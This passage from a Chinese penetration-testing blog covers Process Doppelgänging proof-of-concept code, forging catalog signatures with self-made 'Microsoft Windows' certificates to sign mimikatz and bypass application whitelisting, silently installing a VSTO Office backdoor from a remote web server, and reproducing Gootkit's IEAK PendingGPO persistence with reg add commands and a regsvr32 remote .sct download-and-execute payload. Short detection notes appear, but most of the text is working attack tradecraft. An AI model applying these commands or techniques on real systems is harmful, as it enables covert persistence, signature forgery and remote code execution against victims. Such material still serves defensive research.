<p>对于Native API的使用，可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA/">《渗透技巧——”隐藏”注册表的创建》</a>和<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E6%9B%B4%E5%A4%9A%E6%B5%8B%E8%AF%95/">《渗透技巧——”隐藏”注册表的更多测试》</a></p>

<p><strong>注：</strong></p>

<p>Win10 RS3前的Win10系统，使用该方法会蓝屏，原因在于NtCreateProcessEx函数传入的空指针，细节可参考：</p>

<p>https://bugs.chromium.org/p/project-zero/issues/detail?id=852</p>

<h2 id="0x03-开源poc">0x03 开源POC</h2>
<hr>

<p>目前， 已公开的POC有两个</p>

<h3 id="1processrefund">1、processrefund</h3>

<p>地址：</p>

<p>https://github.com/Spajed/processrefund</p>

<p>目前仅支持64位Windows系统</p>

<p>编译工具：VS2015，安装sdk</p>

<p><strong>实际测试：</strong></p>

<p>Win7 x64</p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-19/2-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>如果选择system32下的calc.exe，会提示权限不够</p>

<p>启动进程calc.exe，但实际上执行MalExe.exe，弹出对话框</p>

<p>进程calc.exe的图标和描述都是正常的calc.exe，数字签名也正常，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-19/2-2.png" alt="Alt text"></p>

<h3 id="2hfiref0x的poc">2、hfiref0x的POC</h3>

<p>https://gist.github.com/hfiref0x/a9911a0b70b473281c9da5daea9a177f</p>

<p>仅有一个c文件，缺少头文件ntos.h</p>

<p>可供参考的位置：</p>

<p>https://github.com/hfiref0x/UACME/blob/master/Source/Shared/ntos.h</p>

<p>但是还需要作二次修改</p>

<p>为了更加了解细节，决定不使用ntdll.lib文件(安装DDK后包含)，改为通过ntdll获得Native API(当然，代码量也会增加)</p>

<p>以自己的方式重写一个ntos.h，并对原POC的inject.c作修改</p>

<p>开源地址如下：</p>

<p>https://github.com/3gstudent/Inject-dll-by-Process-Doppelganging</p>

<p>编译工具：VS2012</p>

<p>支持32位Windows系统</p>

<p><strong>实际测试：</strong></p>

<p>Win7 x86</p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-19/2-3.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>如果选择system32下的calc.exe，会提示权限不够</p>

<p>综上，我们可以看到，Process Doppelgänging在利用效果上和Process Hollowing类似：启动一个正常进程(正常的图标、签名、描述)，在这个进程中执行payload</p>

<p>Process Doppelgänging在利用上的一个缺点： 需要替换文件，所以在替换system32下的文件时，会提示权限不够(管理员权限无法修改该路径下的文件)</p>

<h2 id="0x04-利用思路">0x04 利用思路</h2>
<hr>

<p>在上节我们测试了两个POC，对Process Doppelgänging有了一些认识</p>

<p>而在实际利用中，需要对POC作进一步修改，利用思路如下：</p>

<p>将读取payload的功能去掉，改为使用Buffer存储(可进行压缩编码减小长度)</p>

<p>执行时读取Buffer，解密执行</p>

<p>这样能进一步隐藏payload，实现payload的”无文件”(payload保存在exp中，不需要写入硬盘)</p>

<h2 id="0x05-检测">0x05 检测</h2>
<hr>

<p>Process Doppelgänging并不是能绕过所有的杀毒软件，几个关键函数的调用还是会被拦截(例如NtCreateThreadEx)，并且进程的内存同PE文件存在差异</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了Process Doppelgänging的原理，根据开源代码，编写程序，实现Windows x86和x64系统下的利用，测试功能，分析利用思路，介绍检测方法</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on December 19, 2017
  </div>

  
</article><article class="post">
  <h1>CAT文件数字签名使用技巧</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Windows系统中的重要文件常常会被添加数字签名，用来防止被篡改，部分白名单规则的判定也会基于数字签名。</p>

<p>本文作为数字签名研究系列文章的基础内容，介绍两种数字签名的添加方法，分析CAT文件数字签名的特点，并且纠正一名读者对我文章的回复，地址如下：</p>

<p><a href="http://www.4hou.com/technology/6969.html">《利用xwizard.exe加载dll》</a></p>

<p>基于我的测试，个人认为：<code class="language-plaintext highlighter-rouge">移动位置后，CAT文件数字签名不会失效</code></p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>生成证书的方法</li>
  <li>将数字签名添加在文件末尾的方法(Authenticode)</li>
  <li>将数字签名保存在CAT文件中的方法(catalog)</li>
  <li>使用CAT数字签名的文件特点</li>
</ul>

<h2 id="0x02-将数字签名添加在文件末尾的方法authenticode">0x02 将数字签名添加在文件末尾的方法(Authenticode)</h2>
<hr>

<p>曾在隐写技巧的系列文章中研究过在数字签名中隐藏payload的方法，地址如下：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-%E5%9C%A8PE%E6%96%87%E4%BB%B6%E7%9A%84%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E4%B8%AD%E9%9A%90%E8%97%8FPayload/">《隐写技巧——在PE文件的数字证书中隐藏Payload》</a></p>

<p>文中介绍过证书格式，在此不再赘述</p>

<p>向文件尾部添加数字签名后，可通过文件属性查看</p>

<p>实例：</p>

<p><code class="language-plaintext highlighter-rouge">C:\Windows\System32\consent.exe</code></p>

<p>自带微软数字签名，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-8/2-1.png" alt="Alt text"></p>

<p>可通过powershell验证数字签名：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature .\mimikatz.exe
</code></pre></div></div>

<p>也可以使用工具通过命令行查看数字签名</p>

<p>使用signtool.exe查看：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool.exe verify /v C:\Windows\System32\consent.exe
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-8/2-2.png" alt="Alt text"></p>

<p>使用sigcheck.exe查看：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigcheck.exe -q C:\Windows\System32\consent.exe /accepteula
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-8/2-3.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>signtool.exe:</p>

<p>可用于查看文件的数字签名</p>

<p>安装Visual Studio后包含SDK，其中可找到signtool.exe，位于<code class="language-plaintext highlighter-rouge">C:\Program Files\Microsoft SDKs\Windows\</code></p>

<p>进入开发人员工具的cmd可直接调用signtool.exe</p>

<p>Windows 7 SDK下载地址：</p>

<p>https://www.microsoft.com/en-us/download/details.aspx?id=8279</p>

<p>sigcheck.exe:</p>

<p>可用于查看文件的数字签名</p>

<p>下载地址：</p>

<p>https://docs.microsoft.com/zh-cn/sysinternals/downloads/sigcheck</p>

<p>本文相关文件已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/signtools</p>

<p>生成测试证书的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecert -n "CN=Microsoft Windows Test" -r -sv Root.pvk Root.cer
cert2spc Root.cer Root.spc
pvk2pfx -pvk Root.pvk -pi 123456 -spc Root.spc -pfx Root.pfx -f
</code></pre></div></div>

<p>证书注册：</p>

<p>(管理员权限)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certmgr.exe -add -c Root.cer -s -r localmachine root
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>细节可参考之前的文章《A dirty way of tricking users to bypass UAC》</p>

<p>签名mimikatz.exe：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool sign /f Root.pfx /p 123456 mimikatz.exe
</code></pre></div></div>

<p>显示数字签名正常，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-8/2-4.png" alt="Alt text"></p>

<h2 id="0x03-将数字签名保存在cat文件中的方法catalog">0x03 将数字签名保存在CAT文件中的方法(catalog)</h2>
<hr>

<p>Windows系统中，有些文件通过文件属性无法获得其数字签名信息，但是这些文件也包含数字签名，这里的数字签名指的就是CAT(安全编录)文件数字签名(catalog signing)</p>

<p>资料可参考:</p>

<p>https://docs.microsoft.com/en-us/windows-hardware/drivers/install/catalog-files</p>

<p>签名流程的直观理解：</p>

<ul>
  <li>将文件作sha1加密后得到的hash值保存在CAT文件中（一个CAT文件可保存多个文件hash）</li>
  <li>对该CAT文件添加数字签名</li>
  <li>将CAT文件添加到系统的安全编录数据库</li>
  <li>这些文件也就有了数字签名</li>
</ul>

<p>实例：</p>

<p><code class="language-plaintext highlighter-rouge">C:\Windows\System32\catroot\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\ntph.cat</code></p>

<p>属性-安全目录-项目详细信息-File,可以找到Hash值对应的文件</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-8/3-1.png" alt="Alt text"></p>

<p>通过文件属性无法查看CAT数字签名</p>

<p>.cat文件保存格式为ASN.1标准，直接通过记事本无法查看，需要解密，在线网址如下：</p>

<p>https://lapo.it/asn1js/</p>

<p>选择cat文件后即可解密显示完整格式</p>

<p>格式解析可参考：</p>

<p>https://support.microsoft.com/en-us/help/287547/object-ids-associated-with-microsoft-cryptography</p>

<p>实例：</p>

<p><code class="language-plaintext highlighter-rouge">C:\Windows\System32\xwizard.exe</code></p>

<p>自带CAT格式的数字签名，通过文件属性无法查看CAT数字签名</p>

<p>使用powershell无法获得CAT文件数字签名：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature C:\Windows\System32\xwizard.exe
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-8/3-11.png" alt="Alt text"></p>

<p>注:</p>

<p>Win10系统能够获取CAT文件数字签名,Win7不可以</p>

<p>但可以使用signtool.exe和sigcheck.exe查看数字签名</p>

<p>使用signtool.exe查看：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool.exe verify /pa /a /v C:\Windows\System32\xwizard.exe
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-8/3-2.png" alt="Alt text"></p>

<p>使用sigcheck.exe查看：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigcheck.exe -q C:\Windows\System32\xwizard.exe /accepteula
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-8/3-3.png" alt="Alt text"></p>

<p>下面介绍如何使用CAT文件数字签名</p>

<h3 id="1生成cat文件">1、生成CAT文件</h3>

<p>新建文本文档cat.txt，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[CatalogHeader]
Name=makecat1.cat
[CatalogFiles]
&lt;hash&gt;ExeFile1=mimikatz.exe

</code></pre></div></div>

<p><strong>注：</strong></p>

<p>txt文件尾部需要一个空行，否则，在接下来的操作会报错，提示文件无法找到</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-8/3-4.png" alt="Alt text"></p>

<p>使用makecat.exe生成cat文件：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecat -v cat.txt
</code></pre></div></div>

<h3 id="2使用证书为cat文件添加签名">2、使用证书为CAT文件添加签名</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool sign /f Root.pfx /p 123456 makecat1.cat
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>这里的证书使用的是0x02中生成的证书<code class="language-plaintext highlighter-rouge">Root.pfx</code></p>

<h3 id="3将cat文件添加到系统的安全编录数据库">3、将cat文件添加到系统的安全编录数据库</h3>

<p>(管理员权限)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool catdb -v makecat1.cat
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>删除使用 -r参数：<code class="language-plaintext highlighter-rouge">signtool catdb -r makecat1.cat</code></p>

<p>如果未添加到系统的安全编录数据库，签名状态为unsigned，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-8/3-5.png" alt="Alt text"></p>

<p>添加到系统的安全编录数据库相当于在目录<code class="language-plaintext highlighter-rouge">C:\Windows\System32\catroot\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}</code>添加文件makecat1.cat</p>

<p>删除等价于删除目录<code class="language-plaintext highlighter-rouge">C:\Windows\System32\catroot\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}</code>下对应的CAT文件makecat1.cat</p>

<p>使用signtool.exe获取数字签名：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool.exe verify /pa /a mimikatz.exe
</code></pre></div></div>

<p>使用sigcheck.exe获取数字签名：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigcheck.exe -q mimikatz.exe /accepteula
</code></pre></div></div>

<p>移动位置后，签名仍然有效</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-8/3-6.png" alt="Alt text"></p>

<p>验证结论：<strong>移动位置后，CAT文件数字签名不会失效</strong></p>

<p>当然，利用带有CAT文件数字签名的xwizard.exe加载dll，在某种程度上说，能够绕过应用程序白名单的拦截。</p>

<h2 id="0x04-小结">0x04 小结</h2>
<hr>

<p>本文介绍了两种数字签名的添加方法，分析CAT文件数字签名的特点，对于可执行文件，通过Process Explorer可验证两种不同的数字签名</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-8/4-1.png" alt="Alt text"></p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on October  8, 2017
  </div>

  
</article><article class="post">
  <h1>利用VSTO实现的office后门</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<p>–</p>

<p>最近看了一篇文章《VSTO: The Payload Installer That Probably Defeats Your Application Whitelisting Rules》，介绍了利用VSTO实现Office后门的方法，我在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/">《Use Office to maintain persistence》</a>和<a href="https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/">《Office Persistence on x64 operating system》</a>曾对Office的后门进行过学习，本文将结合自己的研究心得，对该方法进行复现，分析利用思路，分享实际利用方法，最后介绍如何识别这种后门。</p>

<p>文章地址：</p>

<p>https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>VSTO的编写方法</li>
  <li>实际利用思路</li>
  <li>后门检测</li>
</ul>

<h2 id="0x02-vsto的编写方法">0x02 VSTO的编写方法</h2>
<hr>

<h3 id="1vsto简介">1、VSTO简介</h3>

<p>全称Visual Studio Tools for Office</p>

<p>用来定制Office应用程序，能够同office控件交互</p>

<p>集成在Visual Studio安装包中</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-1.png" alt="Alt text"></p>

<h3 id="2vsto开发">2、VSTO开发</h3>

<p>本节内容是对《VSTO: The Payload Installer That Probably Defeats Your Application Whitelisting Rules》的复现</p>

<h4 id="1-新建工程">(1) 新建工程</h4>

<p><code class="language-plaintext highlighter-rouge">Visual c#</code> -&gt; <code class="language-plaintext highlighter-rouge">Office</code> -&gt; <code class="language-plaintext highlighter-rouge">Word 2010外接程序</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-2.png" alt="Alt text"></p>

<h4 id="2-添加代码">(2) 添加代码</h4>

<p>添加引用<code class="language-plaintext highlighter-rouge">System.Windows.Forms</code></p>

<p>添加弹框代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System.Windows.Forms;
MessageBox.Show("1");
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-3.png" alt="Alt text"></p>

<h4 id="3-编译">(3) 编译</h4>

<p>设置对应.Net版本，编译，生成如下6个文件：</p>

<ul>
  <li>Microsoft.Office.Tools.Common.v4.0.Utilities.dll</li>
  <li>Microsoft.Office.Tools.Common.v4.0.Utilities.xml</li>
  <li>WordAddIn2.dll</li>
  <li>WordAddIn2.dll.manifest</li>
  <li>WordAddIn2.pdb</li>
  <li>WordAddIn2.vsto</li>
</ul>

<h4 id="4-安装插件">(4) 安装插件</h4>

<p>执行WordAddIn2.vsto</p>

<p>弹框提示无法验证发行者，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-4.png" alt="Alt text"></p>

<p>选择安装</p>

<p>查看<code class="language-plaintext highlighter-rouge">控制面板</code> -&gt; <code class="language-plaintext highlighter-rouge">程序</code> -&gt; <code class="language-plaintext highlighter-rouge">程序和功能</code>，能够找到新安装的插件</p>

<p>####　(5) 打开word.exe，自动加载插件</p>

<p>弹框，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-5.png" alt="Alt text"></p>

<p>查看Word加载项，能够看到加载插件WordAddIn2，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-6.png" alt="Alt text"></p>

<p>至此，成功实现Office后门的安装</p>

<h2 id="0x03-实际利用思路">0x03 实际利用思路</h2>
<hr>

<p>对于实际利用，首先需要满足安装过程无界面，所以要绕过弹框提示无法验证发行者，需要做如下改进：</p>

<h4 id="1-命令行安装vsto插件">(1) 命令行安装VSTO插件</h4>

<p>使用VSTOInstaller.exe</p>

<p>系统安装Office后包含，默认路径<code class="language-plaintext highlighter-rouge">%ProgramFiles%\Common Files\microsoft shared\VSTO\10.0</code></p>

<p>参数说明：</p>

<p>/i: 安装</p>

<p>/u: 卸载</p>

<p>/s: 静默操作，如果需要信任提示，将不会安装或更新自定义项</p>

<p>安装参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"C:\Program Files\Common Files\microsoft shared\VSTO\10.0\VSTOInstaller.exe" /i /s c:\test\WordAddIn2
</code></pre></div></div>

<p>由于信任提示，无法验证发行者，所以安装失败</p>

<h4 id="2-绕过验证发行者">(2) 绕过验证发行者</h4>

<p>VSTO插件提供签名功能，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/3-1.png" alt="Alt text"></p>

<p>手动生成一组签名证书，使用如下工具</p>

<ul>
  <li>makecert.exe</li>
  <li>cert2spc.exe</li>
  <li>pvk2pfx.exe</li>
  <li>certmgr.exe</li>
</ul>

<p>来自于Windows SDK，可供参考下载的地址：</p>

<p>https://github.com/3gstudent/signtools</p>

<p>生成命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecert -n "CN=Microsoft Windows" -r -sv Root.pvk Root.cer
cert2spc Root.cer Root.spc
pvk2pfx -pvk Root.pvk -pi 12345678password -spc Root.spc -pfx Root.pfx -f
</code></pre></div></div>

<p>执行后生成Root.cer、Root.pfx、Root.pvk、Root.spc四个文件</p>

<p>替换插件WordAddIn2的证书，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/3-2.png" alt="Alt text"></p>

<p>证书注册（管理员权限）：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certmgr.exe -add Root.cer -c -s -r localMachine TrustedPublisher
certmgr.exe -add -c Root.cer -s -r localmachine root
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>需要将证书同时添加到<code class="language-plaintext highlighter-rouge">TrustedPublisher</code>和<code class="language-plaintext highlighter-rouge">root</code></p>

<p>再次安装VSTO插件，不会被拦截</p>

<h4 id="3-远程安装">(3) 远程安装</h4>

<p>VSTOInstaller.exe支持远程安装</p>

<p>可以将VSTO插件放在远程Web服务器上</p>

<p>安装参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"C:\Program Files\Common Files\microsoft shared\VSTO\10.0\VSTOInstaller.exe" /s /i http://192.168.62.131/1/WordAddIn1.vsto
</code></pre></div></div>

<p>综上，实际利用过程如下：</p>

<ul>
  <li>生成VSTO插件</li>
  <li>为插件添加签名</li>
  <li>证书注册</li>
  <li>远程下载安装</li>
</ul>

<h2 id="0x04-后门检测">0x04 后门检测</h2>
<hr>

<p>1、查看<code class="language-plaintext highlighter-rouge">控制面板</code> -&gt; <code class="language-plaintext highlighter-rouge">程序</code> -&gt; <code class="language-plaintext highlighter-rouge">程序和功能</code>，是否有可疑插件</p>

<p><strong>注：</strong></p>

<p>VSTO插件并不会在注册表卸载配置的位置(<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\</code>)创建新键值</p>

<p>2、查看Office的COM加载项</p>

<p><strong>注：</strong></p>

<p>禁用宏并不会阻止VSTO插件的加载</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文测试了利用VSTO实现Office后门的方法，结合实际利用思路，分析检测方法</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on February  3, 2018
  </div>

  
</article><article class="post">
  <h1>GookitBankingTrojan中的后门利用分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Gootkit Banking Trojan在2014年被首次发现，最近Daniel Bunce（@ 0verfl0w_）介绍了一些对于Gootkit Banking Trojan的分析，文章地址如下：</p>

<p>https://www.sentinelone.com/blog/gootkit-banking-trojan-persistence-other-capabilities/</p>

<p>其中，Gootkit Banking Trojan使用的后门启动方法是独有的，所以本文仅在技术研究的角度复现Gootkit Banking Trojan使用的后门启动方法，分析利用思路，给出防御和检测的建议。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>原理介绍</li>
  <li>inf文件的基础知识</li>
  <li>复现后门启动方法</li>
  <li>分析利用方法</li>
  <li>检测和防御建议</li>
</ul>

<h2 id="0x02-原理介绍">0x02 原理介绍</h2>
<hr>

<p>explorer.exe在运行时会加载特定的组策略对象(GPO)，其中包括Internet Explorer Administration Kit(IEAK)的GPO</p>

<p>如果通过添加注册表的方式为IKAK创建一个Pending GPO，指向一个inf文件，那么在explorer.exe启动时，就会加载这个Pending GPO，执行inf文件中的内容</p>

<p>这个方法的优点是不需要管理员权限</p>

<h2 id="0x03-inf文件的基础知识">0x03 inf文件的基础知识</h2>
<hr>

<p>inf全称Device INFormation File，是Microsoft为硬件设备制造商发布其驱动程序推出的一种文件格式</p>

<p>对大小写不敏感</p>

<p>文件格式：</p>

<p>由多个节组成，节名用方括号括起来</p>

<p>值得注意的节：</p>

<h3 id="1version节">1.Version节</h3>

<p>inf文件都包含这个节，用来描述支持的设备类型和适用的操作系统</p>

<p><code class="language-plaintext highlighter-rouge">signature="$CHICAGO$</code>表示该inf文件适用于Windows98之后的所有操作系统</p>

<p><code class="language-plaintext highlighter-rouge">signature="$Windows NT$"</code>表示该inf文件适用于Windows 2000/XP/2003操作系统</p>

<h3 id="2defaultinstall节">2.DefaultInstall节</h3>

<p>默认情况下首先执行该节内的内容，通常包括文件拷贝、删除，注册表键值的更新，子键删除等功能，还支持执行命令：</p>

<ul>
  <li>RunPreSetupCommands，本节中指定的命令在安装服务配置文件之前运行</li>
  <li>RunPostSetupCommands，本节中指定的命令在安装程序完成服务配置文件后运行</li>
  <li>RunPreUnInstCommands，本节中指定的命令在卸载程序开始之前运行</li>
  <li>RunPostUnInstCommands，本节中指定的命令在卸载程序运行后运行</li>
</ul>

<p>参考资料：</p>

<p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc939869(v=technet.10)#information-inf-file-entries</p>

<p>例如一个分别执行cmd命令和弹出计算器的test.inf文件示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Version]
Signature="$CHICAGO$"
AdvancedINF=2.5,"advpack.dll"
[DefaultInstall]
RunPreSetupCommands=Command1
RunPostSetupCommands=Command2
[Command1]
C:\WINDOWS\SYSTEM32\calc.exe
[Command2]
C:\WINDOWS\SYSTEM32\cmd.exe
</code></pre></div></div>

<p>命令行下的启动方式：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32.exe advpack.dll,LaunchINFSection test.inf,DefaultInstall
</code></pre></div></div>

<p>执行后先弹出计算器，关闭计算器后，再弹出cmd.exe</p>

<h2 id="0x04-后门启动方法复现">0x04 后门启动方法复现</h2>
<hr>

<p>1.使用测试程序putty.exe，保存位置： <code class="language-plaintext highlighter-rouge">c:\test\putty.exe</code></p>

<p>2.新建putty.inf，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Version]
Signature="$CHICAGO$"
AdvancedINF=2.5,"You need a new version of advpack.dll"

[DefaultInstall]
RunPreSetupCommands=Command1:2
[Command1]
c:\test\putty.exe
</code></pre></div></div>

<p>3.新建注册表项</p>

<ul>
  <li>HKEY_CURRENT_USER\Software\Microsoft\Ieak\GroupPolicy\PendingGPOs，Count, REG_DWORD，1</li>
  <li>HKEY_CURRENT_USER\Software\Microsoft\Ieak\GroupPolicy\PendingGPOs，Path1，REG_SZ，”c:\test\test.inf”</li>
  <li>HKEY_CURRENT_USER\Software\Microsoft\Ieak\GroupPolicy\PendingGPOs，Section1，REG_SZ，”DefaultInstall”</li>
</ul>

<p><strong>注：</strong></p>

<p>原文中Section1的值为<code class="language-plaintext highlighter-rouge">[DefaultInstall]</code>，经测试，此处存在bug，正确的值应该为<code class="language-plaintext highlighter-rouge">DefaultInstall</code></p>

<p>注册表设置如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-10/2-1.png" alt="Alt text"></p>

<p>4.重启系统</p>

<p>系统启动后执行putty.exe，复现成功</p>

<p><strong>注：</strong></p>

<p>系统重启后该注册表会被清除，为了保证下次重启系统时再次触发后门，需要再次修改注册表，添加对应的键值，可供参考的cmd命令如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hkcu\SOFTWARE\Microsoft\IEAK\GroupPolicy\PendingGPOs /v Count /t REG_DWORD /d 1
reg add hkcu\SOFTWARE\Microsoft\IEAK\GroupPolicy\PendingGPOs /v Path1 /t REG_SZ /d "c:\test\test.inf"
reg add hkcu\SOFTWARE\Microsoft\IEAK\GroupPolicy\PendingGPOs /v Section1 /t REG_SZ /d "DefaultInstall"
</code></pre></div></div>

<h2 id="0x05-方法优化">0x05 方法优化</h2>
<hr>

<h3 id="1inf文件不需要同要启动的exe文件同名">1.inf文件不需要同要启动的exe文件同名</h3>

<p>inf文件名称可以任意，例如test.inf</p>

<p><strong>注：</strong></p>

<p>原文描述需要inf文件同exe文件同名</p>

<h3 id="2inf文件内容格式不固定">2.inf文件内容格式不固定</h3>

<p><code class="language-plaintext highlighter-rouge">AdvancedINF=2.5,"You need a new version of advpack.dll"</code>可修改为<code class="language-plaintext highlighter-rouge">AdvancedINF=2.5,"11111111"</code></p>

<h3 id="3inf文件的payload不唯一">3.inf文件的payload不唯一</h3>

<p>还可以实现文件拷贝、删除，注册表键值的更新，子键删除等功能</p>

<p>如果是执行命令，可以同sct结合实现无文件落地，例如实现远程下载执行的文件内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Version]
Signature="$CHICAGO$"
AdvancedINF=2.5,"advpack.dll"
[DefaultInstall]
RunPreSetupCommands=Command1
[Command1]
regsvr32 /u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll
</code></pre></div></div>

<h2 id="0x06-利用分析">0x06 利用分析</h2>
<hr>

<p>优点如下：</p>

<p>1.不需要管理员权限，只需要普通用户权限即可</p>

<p>2.payload扩展性高，同其他方法结合(如sct)可实现远程下载执行，不需要向硬盘写入文件</p>

<h2 id="0x07-检测和防御建议">0x07 检测和防御建议</h2>
<hr>

<p>监控注册表位置：<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Microsoft\Ieak\GroupPolicy\PendingGPOs</code></p>

<p>默认配置下，系统不存在注册表项：<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Microsoft\Ieak\GroupPolicy</code></p>

<p><strong>注：</strong></p>

